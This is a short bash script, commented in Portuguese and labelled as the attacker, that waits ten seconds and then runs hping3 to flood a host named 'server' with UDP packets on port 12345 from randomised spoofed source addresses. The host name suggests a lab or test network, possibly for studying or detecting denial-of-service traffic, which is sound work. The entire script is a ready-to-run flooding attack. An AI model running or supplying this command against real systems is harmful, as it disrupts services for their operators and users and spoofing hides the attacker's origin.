#!/bin/bash

echo "[attacker] Aguardando 10 segundos antes de iniciar o ataque..."
sleep 10

echo "[attacker] Iniciando ataque UDP realista com hping3..."
hping3 --flood --udp -p 12345 --sign "ataque haha" --rand-source server
